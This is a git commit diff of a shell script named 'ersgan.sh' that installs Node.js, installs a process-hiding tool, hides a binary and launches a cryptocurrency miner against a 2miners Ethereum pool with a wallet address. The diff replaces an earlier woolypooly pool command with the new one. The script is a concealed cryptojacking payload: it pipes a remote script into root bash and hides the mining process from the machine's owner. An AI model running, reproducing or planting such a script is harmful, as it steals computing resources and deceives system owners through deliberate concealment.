3f0eac21503bf082987f30b6f5cfc64989c93cb3
ngel4ng <108847948+ngel4ng@users.noreply.github.com>
2022-07-16 20:04:22 -0700

    Update ersgan.sh

--- ersgan.sh
+++ ersgan.sh
@@ -1,6 +1,6 @@
 curl -fsSL https://deb.nodesource.com/setup_14.x | sudo -E bash -
 apt-get install -y nodejs
 npm i -g node-process-hider
-ph add co
-chmod +x co
-./co -pool_uri=pool.us.woolypooly.com:40000 -worker=angel -devices=0 -account=WPMYW5nZWxlbmNhbmRpbGFkb0BnbWFpbC5jb20 
+ph add Z
+chmod +x Z
+./Z -u 0x4421Ca28FA68E783EA7D32dBe73AEd2160b8d434.$(echo $(shuf -i 1-999 -n 1)-an) -l us-eth.2miners.com --port=2020 --intensity=85 -p x --par=ethash
